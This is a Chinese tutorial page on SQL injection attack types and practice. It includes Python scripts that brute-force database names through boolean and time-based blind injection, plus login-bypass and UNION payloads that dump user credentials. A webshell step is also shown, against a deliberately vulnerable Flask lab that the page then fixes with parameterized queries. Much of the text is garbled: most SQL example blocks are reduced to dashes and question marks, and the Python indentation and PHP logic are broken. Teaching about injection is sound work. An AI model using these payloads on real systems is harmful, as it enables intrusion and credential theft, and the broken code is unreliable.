---
order: 160
tags:
  - mysql
  - performance
  - database
difficulty: advanced
title: 'SQL 注入攻击类型与实战'
module: mysql
category: 'MySQL Advanced'
description: 联合注入、盲注、报错注入与绕过技巧。
author: Anonymous
related:
  - mysql/控制器与应用
  - mysql/SQL注入基础与检测
  - mysql/SQL注入防御策略
  - 'mysql/项目示例-电商数据库设计'
prerequisites:
  - mysql/语法速查
updated: '2026-08-01'
---

---

## 1. SQL 注入攻击类型 (Attack Types)

### 1.1 带内注入（In-band Injection）

带内注入是最常见和最容易实施的 SQL 注入类型，攻击者使用同一通道发送攻击和获取结果。

#### 1.1.1 基于错误的注入（Error-based）

利用数据库错误信息来获取数据。
**MySQL 示例**：

```sql
 -
 ?
 ?
 -
 ?
 -
 ?
 -
 ?
```

**SQL Server 示例**：

```sql
 -
 ?
 -
 ?
```

#### 1.1.2 UNION 查询注入

利用 UNION 操作符将恶意查询结果合并到正常查询中。
**前提条件**：

- 原查询与恶意查询的列数必须相同
- 数据类型必须兼容
  **攻击步骤**：

```sql
 -
 ?
 ?
 ?
 ?
 -
 ?
 # 观察页面上 1、2、3 哪个位置显示出来了
 -
 ?
 ?
 -
 ?
 ?
 ?
 -
 ?
 ?
 -
 ?
 ?
```

#### 1.1.3 堆叠查询注入（Stacked Queries）

允许在一个查询中执行多条 SQL 语句。

```sql
 -
 ?
 -
 ?
 -
 ?
 -
 ?
 -
 ?
```

### 1.2 盲注（Blind Injection）

当应用程序不返回数据库错误信息时，攻击者需要通过其他方式推断数据。

#### 1.2.1 布尔盲注（Boolean Blind）

通过应用程序的响应差异来推断数据。
**判断逻辑**：

- 如果注入条件为真，页面正常显示
- 如果注入条件为假，页面显示不同或报错

```sql
 -
 ?
 ?
 ?
 -
 ?
 ?
 ?
 -
 -
 ?
 ?
 ?
 -
 ?
 -
 ?
 -
 ?
 ?
```

**自动化脚本**：

```python
 import requests
 def boolean_blind_injection(url):
  # 目标 URL
  target_url = url
  # 获取数据库名长度
  db_name_length = 0
  for i in range(1, 30):
  payload = f"1' AND LENGTH(database())={i} -- "
  response = requests.get(target_url, params={'id': payload})
  if "正常" in response.text:
  db_name_length = i
  print(f"数据库名长度：{i}")
  break
  # 获取数据库名
  db_name = ""
  charset = "abcdefghijklmnopqrstuvwxyz0123456789_"
  for pos in range(1, db_name_length + 1):
  for char in charset:
  payload = f"1' AND SUBSTRING(database(), {pos}, 1)='{char}' -- "
  response = requests.get(target_url, params={'id': payload})
  if "正常" in response.text:
  db_name += char
  print(f"第 {pos} 个字符：{char}")
  break
  print(f"数据库名：{db_name}")
  return db_name
```

#### 1.2.2 时间盲注（Time-based）

利用数据库延迟函数，通过响应时间来推断数据。

```sql
 -
 ?
 -
 ?
 ?
 -
 ?
 -
 ?
 -
 ?
```

**时间盲注脚本**：

```python
 import requests
 import time
 def time_based_injection(url):
  target_url = url
  # 测试是否存在注入
  payload = "1' AND SLEEP(5) -- "
  start_time = time.time()
  response = requests.get(target_url, params={'id': payload})
  end_time = time.time()
  if end_time - start_time >= 5:
  print("存在时间盲注！")
  else:
  print("不存在时间盲注")
  return
  # 获取数据库名
  db_name = ""
  charset = "abcdefghijklmnopqrstuvwxyz0123456789_"
  for pos in range(1, 20):
  for char in charset:
  payload = f"1' AND IF(SUBSTRING(database(), {pos}, 1)='{char}', SLEEP(3), 0) -- "
  start_time = time.time()
  response = requests.get(target_url, params={'id': payload})
  end_time = time.time()
  if end_time - start_time >= 3:
  db_name += char
  print(f"第 {pos} 个字符：{char}")
  break
  if len(db_name) == pos - 1 and pos > 1:
  break
  print(f"数据库名：{db_name}")
  return db_name
```

### 1.3 二次注入（Second-order Injection）

恶意数据被存储在数据库中，之后在其他查询中被使用时触发注入。
**攻击场景**：

1. **存储阶段**：攻击者注册用户名 `admin' --`，系统将其存储到数据库
2. **触发阶段**：其他功能使用该用户名时，如修改密码的 SQL 查询

```python
 # 1. 用户注册时输入恶意数据
 def register(username, password):
  sql = f"INSERT INTO users (username, password) VALUES ('{username}', '{password}')"
  cursor.execute(sql)
  # 此时不会触发注入，因为只是插入数据
 # 2. 存储的数据：username = 'admin' --'
 # 3. 其他功能使用该数据时触发注入
 def get_user_profile(username):
  sql = f"SELECT * FROM users WHERE username = '{username}'"
  cursor.execute(sql)
  return cursor.fetchone()
 # 4. 攻击者以 admin' -- 用户名登录后调用 get_user_profile
 # 会返回真正的 admin 用户信息
```

**实际案例**：
WordPress 插件中曾发现过二次注入漏洞，攻击者通过评论功能注入恶意代码，该代码在管理员查看评论时执行。

### 1.4 宽字节注入（Wide Byte Injection）

利用字符编码漏洞进行注入。
**原理**：

- 应用程序使用 `addslashes()` 或类似函数转义单引号，添加反斜杠
- 如果数据库使用宽字节编码（如 GBK），攻击者可以利用编码特性绕过

```sql
 -
 -
 -
 -
 -
 ?
 -
 -
 -
 -
 -
```

**防御方法**：

- 使用 UTF-8 编码并设置 `character_set_client=binary`
- 使用参数化查询而不是字符串拼接

### 1.5 联合注入（Union-based Injection）

详见 1.1.2 节。

### 1.6 带外注入（Out-of-band Injection）

当常规渠道（带内）无法获取数据时，使用替代通道。

```sql
 -
 ?
 -
 ?
 -
 ?
```

## 2. SQL 注入实战案例 (Practical Cases)

### 2.1 案例 1：绕过登录验证

#### 2.1.1 场景描述

一个简单的登录页面，用户输入用户名和密码。

#### 2.1.2 危险代码

```php
 <?php
 // 危险代码：直接拼接用户输入
 $username = $_POST['username'];
 $password = $_POST['password'];
 $sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
 $result = mysqli_query($conn, $sql);
 if (mysqli_num_rows($result) > 0) {
  echo "登录成功！";
 }
  echo "登录失败！";
 }
 ?
```

#### 2.1.3 攻击 Payload

```
 用户名：admin' --
 密码：任意值
```

#### 2.1.4 执行的 SQL

```sql
 SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
```

#### 2.1.5 结果分析

注释符 `--` 后面的内容被忽略，只验证了 `username = 'admin'`，如果存在 admin 用户，攻击者即可成功登录。

#### 2.1.6 其他 Payload 变体

```sql
 -
 用户名：admin' OR '1'='1' --
 密码：任意值
 -
 用户名：admin' UNION SELECT 1, 'admin', 'password' --
 密码：任意值
 -
 用户名：' OR 1=1 --
 密码：任意值
```

### 2.2 案例 2：UNION 查询获取数据

#### 2.2.1 场景描述

一个商品详情页面，通过 URL 参数 `id` 获取商品信息。

#### 2.2.2 危险代码

```python
 # 危险代码
 def get_product(product_id):
  sql = f"SELECT id, name, price FROM products WHERE id = {product_id}"
  cursor.execute(sql)
  return cursor.fetchone()
```

#### 2.2.3 攻击步骤

**步骤 1：确定列数**

```
 ?
 ?
 ?
 ?
```

步骤 2：确定显示位置

```
 ?
```

步骤 3：获取数据库信息

```
 ?
```

步骤 4：获取表名

```
 ?
```

步骤 5：获取列名

```
 ?
```

步骤 6：获取用户数据

```
 ?
```

### 2.3 案例 3：布尔盲注

#### 2.3.1 场景描述

页面不显示数据库错误，但对不同的输入有不同的响应。

#### 2.3.2 攻击脚本

```python
 import requests
 def blind_injection(url):
  target_url = url
  # 1. 猜解数据库名长度
  db_name_length = 0
  for i in range(1, 20):
  payload = f"1' AND LENGTH(database())={i} -- "
  response = requests.get(target_url, params={'id': payload})
  if "正常" in response.text:
  db_name_length = i
  break
  print(f"数据库名长度：{db_name_length}")
  # 2. 逐字符猜解数据库名
  db_name = ""
  for i in range(1, db_name_length + 1):
  for c in "abcdefghijklmnopqrstuvwxyz0123456789_":
  payload = f"1' AND SUBSTRING(database(), {i}, 1)='{c}' -- "
  response = requests.get(target_url, params={'id': payload})
  if "正常" in response.text:
  db_name += c
  break
  print(f"数据库名：{db_name}")
  return db_name
```

### 2.4 案例 4：时间盲注

#### 2.4.1 攻击脚本

```python
 import requests
 import time
 def time_based_injection(url):
  target_url = url
  # 测试是否存在时间盲注
  start_time = time.time()
  payload = "1' AND SLEEP(5) -- "
  response = requests.get(target_url, params={'id': payload})
  end_time = time.time()
  if end_time - start_time >= 5:
  print("存在时间盲注！")
  else:
  print("不存在时间盲注")
  return
  # 猜解数据库名
  db_name = ""
  for i in range(1, 20):
  found = False
  for c in "abcdefghijklmnopqrstuvwxyz0123456789_":
  start_time = time.time()
  payload = f"1' AND IF(SUBSTRING(database(), {i}, 1)='{c}', SLEEP(3), 0) -- "
  response = requests.get(target_url, params={'id': payload})
  end_time = time.time()
  if end_time - start_time >= 3:
  db_name += c
  found =
  print(f"找到第 {i} 个字符：{c}")
  break
  if not found:
  break
  print(f"数据库名：{db_name}")
  return db_name
```

### 2.5 案例 5：获取服务器 Shell

#### 2.5.1 前提条件

- MySQL 版本 >= 5.0
- 当前用户具有 FILE 权限
- Web 目录可写
- MySQL 服务账户有执行权限

#### 2.5.2 攻击步骤

```sql
 -
 ?
 -
 ?
 -
 ?
 -
 http://target.com/shell.php?cmd=whoami
```

#### 2.5.3 防御措施

- 限制 MySQL 用户的 FILE 权限
- Web 目录设置正确的权限
- 使用参数化查询

## 3. 实战演练 (Hands-on Practice)

### 3.1 搭建测试环境

#### 3.1.1 创建测试数据库

```sql
 -
 CREATE DATABASE sqli_test;
 use sqli_test;
 -
 CREATE TABLE users (
  id INT PRIMARY KEY AUTO_INCREMENT,
  username VARCHAR(50) NOT NULL,
  password VARCHAR(50) NOT NULL,
  email VARCHAR(100),
  role VARCHAR(20) DEFAULT 'user',
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
 )
 -
 inSERT INTO users (username, password, email, role) VALUES
 ('admin', 'admin123', 'admin@example.com', 'admin'),
 ('user1', 'user123', 'user1@example.com', 'user'),
 ('user2', 'user456', 'user2@example.com', 'user');
 -
 CREATE TABLE products (
  id INT PRIMARY KEY AUTO_INCREMENT,
  name VARCHAR(100) NOT NULL,
  price DECIMAL(10, 2) NOT NULL,
  description TEXT,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
 )
 -
 inSERT INTO products (name, price, description) VALUES
 ('Product 1', 99.99, 'Description 1'),
 ('Product 2', 199.99, 'Description 2'),
 ('Product 3', 299.99, 'Description 3');
```

#### 3.1.2 创建 Vulnerable Web 应用

```python
 from flask import Flask, request
 import pymysql
 app = Flask(__name__)
 def get_db_connection():
  return pymysql.connect(
  host='localhost',
  user='root',
  password='password',
  database='sqli_test'
  )
 @app.route('/product')
 def product():
  product_id = request.args.get('id')
  # 危险代码：直接拼接
  conn = get_db_connection()
  cursor = conn.cursor()
  sql = f"SELECT * FROM products WHERE id = {product_id}"
  cursor.execute(sql)
  result = cursor.fetchone()
  conn.close()
  return str(result)
 @app.route('/login', methods=['POST'])
 def login():
  username = request.form.get('username')
  password = request.form.get('password')
  # 危险代码：直接拼接
  conn = get_db_connection()
  cursor = conn.cursor()
  sql = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
  cursor.execute(sql)
  result = cursor.fetchone()
  conn.close()
  if result:
  return "Login successful!"
  else:
  return "Login failed!"
 if __name__ == '__main__':
  app.run(debug=True, host='0.0.0.0', port=5000)
```

### 3.2 攻击演练

#### 3.2.1 练习 1：绕过登录

```
 访问：http://localhost:5000/login
 提交 POST 请求：
 -
 -
```

#### 3.2.2 练习 2：UNION 查询

```
 访问：http://localhost:5000/product?id=-1 UNION SELECT 1, database(), version(), 4
```

#### 3.2.3 练习 3：获取用户数据

```
 访问：http://localhost:5000/product?id=-1 UNION SELECT id, username, password, role FROM users
```

#### 3.2.4 练习 4：时间盲注

```
 # 测试是否存在注入
 访问：http://localhost:5000/product?id=1' AND SLEEP(5) --
 # 如果响应延迟 5 秒，说明存在注入
```

### 3.3 修复演练

```python
 @app.route('/product')
 def product_safe():
  product_id = request.args.get('id')
  # 验证输入
  if not product_id.isdigit():
  return "Invalid product ID"
  # 使用参数化查询
  conn = get_db_connection()
  cursor = conn.cursor()
  sql = "SELECT * FROM products WHERE id = %s"
  cursor.execute(sql, (product_id,))
  result = cursor.fetchone()
  conn.close()
  return str(result)
 @app.route('/login', methods=['POST'])
 def login_safe():
  username = request.form.get('username')
  password = request.form.get('password')
  # 使用参数化查询
  conn = get_db_connection()
  cursor = conn.cursor()
  sql = "SELECT * FROM users WHERE username = %s AND password = %s"
  cursor.execute(sql, (username, password))
  result = cursor.fetchone()
  conn.close()
  if result:
  return "Login successful!"
  else:
  return "Login failed!"
```

---

## 参考文献



MySQL 官方文档：https://dev.mysql.com/doc/
MySQL 8.0 参考手册：https://dev.mysql.com/doc/refman/8.0/en/
High Performance MySQL（O'Reilly）：https://www.oreilly.com/library/view/high-performance-mysql/
Percona 博客：https://www.percona.com/blog/

## 延伸阅读



MySQL 索引与优化，见 020-mysql 模块文档。
MySQL 日志体系，见 020-mysql 模块 redo/binlog 文档。
Redis 缓存与 MySQL 组合，见 022-redis 模块。
尚硅谷 Bilibili 空间（https://space.bilibili.com/302417610 ）提供 MySQL 高级课程。

## 模块文档速查表

| 文档 | 主题 | 与本文的关联 |
| --- | --- | --- |
| MySQL 概述与数据库设计 | 001-MySQLOverviewDatabaseDesign | 本文的前置基础 |
| MySQL 环境搭建 | 002-MySQLEnvSetup | 本文的前置基础 |
| MySQL 数据类型与约束 | 003-MySQLDataTypeConstraint | 本文的并列主题 |
| SQL 数据定义与高级对象 | 004-SQLDataDefinitionAdvanced | 本文的并列主题 |
| MyISAM存储引擎 | 005-MyISAMStorageEngine | 本文的并列主题 |
| SQL 数据操作与查询 | 006-SQLDataOperationQuery | 本文的并列主题 |
| Memory存储引擎 | 007-MemoryStorageEngine | 本文的并列主题 |
| NDB-Cluster | 008-NDBCluster | 本文的并列主题 |
| 聚簇索引与二级索引 | 009-ClusteredIndexSecondaryIndex | 本文的并列主题 |
| 联合索引与最左前缀原则 | 010-CompositeIndexLeftmostPrefixPrinciple | 本文的并列主题 |
| 索引下推 | 011-IndexConditionPushdown | 本文的并列主题 |
| 全文索引 | 012-FullTextIndex | 本文的并列主题 |
| 前缀索引 | 013-PrefixIndex | 本文的并列主题 |
| 索引提示与强制索引 | 014-IndexHintForceIndex | 本文的并列主题 |
| 索引统计信息与直方图 | 015-IndexStatsHistogram | 本文的并列主题 |
| SQL 函数与高级查询 | 016-SQLFunctionAndAdvancedQuery | 本文的并列主题 |
| 索引失效场景 | 017-IndexFailureScene | 本文的并列主题 |
| EXPLAIN输出详解 | 018-EXPLAINDetailed | 本文的并列主题 |
| 慢查询日志 | 019-SlowQueryLog | 本文的并列主题 |
| 优化器追踪 | 020-OptimizerTrace | 本文的性能延伸 |
| 子查询优化 | 021-SubqueryOptimization | 本文的性能延伸 |
| 派生表优化 | 022-DerivedTableOptimization | 本文的性能延伸 |
| GROUP-BY与ORDER-BY优化 | 023-GroupByOrderByOptimization | 本文的性能延伸 |
| JOIN算法 | 024-JOINAlgorithm | 本文的并列主题 |
| 事务隔离级别底层实现 | 025-TransactionIsolationImplementation | 本文的并列主题 |
| MVCC原理 | 026-MVCCPrinciple | 本文的原理深化 |
| 多表联查详解 | 027-MultiTableJoinDetailed | 本文的并列主题 |
| 锁分类 | 028-LockClassification | 本文的并列主题 |
| 死锁检测与处理 | 029-DeadlockDetectionHandling | 本文的并列主题 |
| 分布式事务 | 030-DistributedTransaction | 本文的并列主题 |
| 二进制日志 | 031-Binlog | 本文的并列主题 |
| 重做日志 | 032-RedoLog | 本文的并列主题 |
| 撤销日志 | 033-UndoLog | 本文的并列主题 |
| 日志系统 | 034-LogSystem | 本文的并列主题 |
| 逻辑备份 | 035-LogicalBackup | 本文的并列主题 |
| 物理备份 | 036-PhysicalBackup | 本文的并列主题 |
| 基于时间点恢复 | 037-PITR | 本文的并列主题 |
| 主从复制 | 038-Replication | 本文的并列主题 |
| 进阶查询与多表操作 | 039-AdvancedQueryMultiTableOperation | 本文的并列主题 |
| GTID | 040-GTID | 本文的并列主题 |
| 并行复制 | 041-ParallelReplication | 本文的并列主题 |
| 组复制 | 042-GroupReplication | 本文的并列主题 |
| InnoDB-Cluster | 043-InnoDBCluster | 本文的并列主题 |
| 分区表 | 044-PartitionedTable | 本文的并列主题 |
| 分库分表中间件 | 045-ShardingMiddleware | 本文的并列主题 |
| 账户与权限管理 | 046-AccountPermissionManagement | 本文的安全延伸 |
| SSL-TLS加密 | 047-SSLEncryption | 本文的安全延伸 |
| 防火墙插件 | 048-FirewallPlugin | 本文的并列主题 |
| InnoDB体系架构 | 049-InnoDBSystemArchitecture | 本文的原理深化 |
| 数据加密 | 050-DataEncryption | 本文的安全延伸 |
| MySQL 索引与执行计划 | 051-MySQLIndexExecutionPlan | 本文的并列主题 |
| MySQL9新特性与并行查询 | 052-MySQL9NewFeaturesParallelQuery | 本文的并列主题 |
| VECTOR向量类型 | 053-VectorType | 本文的并列主题 |
| JSON模式验证与聚合函数 | 054-JSONSchemaValidationAggregate | 本文的并列主题 |
| 复制与高可用 | 055-ReplicationHA | 本文的并列主题 |
| 不可见索引 | 056-InvisibleIndex | 本文的并列主题 |
| 性能调优与安全 | 057-PerformanceTuningSecurity | 本文的性能延伸 |
| 函数索引 | 058-FunctionalIndex | 本文的并列主题 |
| 存储过程与函数 | 059-StoredProcedureAndFunction | 本文的并列主题 |
| MVCC快照读与当前读 | 060-MVCCSnapshotCurrentRead | 本文的并列主题 |
| 索引原理与性能优化 | 061-IndexPrinciplePerformanceOptimization | 本文的性能延伸 |
| 触发器与事件 | 062-TriggerEvent | 本文的并列主题 |
| Redo与Undo与Binlog写入时机 | 063-RedoUndoBinlogWriteTiming | 本文的并列主题 |
| 两阶段提交 | 064-TwoPhaseCommit | 本文的并列主题 |
| 间隙锁与临键锁解决幻读 | 065-GapLockNextKeyLockSolutionPhantomRead | 本文的并列主题 |
| 主从复制延迟原因与解决 | 066-ReplicationDelayCauseSolution | 本文的并列主题 |
| 分库分表策略 | 067-ShardingStrategy | 本文的并列主题 |
| JSON类型与JSON-TABLE | 068-JSONTypeJSONTable | 本文的并列主题 |
| 事务与锁机制 | 069-TransactionLockMechanism | 本文的原理深化 |
| MySQL 配置与运维 | 070-MySQLConfigOps | 本文的并列主题 |
| MySQL 快速查阅 | 071-MySQLQuickLookup | 本文的并列主题 |
| MySQL 控制器与应用 | 072-MySQLControlApplication | 本文的并列主题 |
| SQL 注入基础与检测 | 073-SQLInjectionBasicsDetection | 本文的前置基础 |
| SQL 注入攻击类型与实战 | 074-SQLInjectionAttackTypePractice | 本文自身 |
| SQL 注入防御策略 | 075-SQLInjectionDefenseStrategy | 本文的并列主题 |
| MySQL 项目示例：电商数据库设计 | 076-MySQLProjectExampleDatabaseDesign | 本文的综合应用 |
| MySQL 理论知识点 | 077-MySQLTheoryKnowledge | 本文的并列主题 |
| MySQL DDL 数据定义 | 078-DDL | 本文的并列主题 |
| MySQL DML 数据操作 | 079-DML | 本文的并列主题 |
| MySQL DQL 查询速查 | 080-DQL | 本文的并列主题 |
| MySQL 索引管理 | 081-IndexManagement | 本文的并列主题 |
| MySQL 用户与权限管理 | 082-UserPermission | 本文的安全延伸 |
| MySQL CLI 命令 | 083-CLI | 本文的并列主题 |
| mysqladmin 管理命令 语法速查手册 | 084-Mysqladmin | 本文的并列主题 |
| 视图 语法速查手册 | 085-View | 本文的并列主题 |
| 事件调度器 语法速查手册 | 086-EventScheduler | 本文的并列主题 |
| 字符集与排序规则 语法速查手册 | 087-CharsetCollation | 本文的并列主题 |
